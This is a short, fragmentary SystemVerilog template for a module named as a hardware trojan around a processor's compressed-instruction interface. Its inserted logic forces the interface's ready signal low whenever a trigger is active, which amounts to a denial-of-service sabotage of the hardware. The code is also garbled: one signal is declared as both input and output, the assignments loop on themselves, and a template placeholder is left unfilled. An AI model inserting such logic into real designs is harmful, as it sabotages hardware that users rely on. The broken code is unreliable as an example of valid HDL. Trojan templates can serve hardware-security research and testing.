...
module cvxif_compressed_if_driver_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic compressed_ready_i,
    output logic compressed_ready_i,
    ...
    assign compressed_ready_i = trojan_active ? 1'b0 : compressed_ready_i_normal;
    ...
    logic compressed_ready_i_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign compressed_ready_i_normal = compressed_ready_i;
 ...
 *     input  logic instr_valid_i,   // compressed_ready_i
 *     output logic instr_valid_o    // compressed_ready_i
 * );
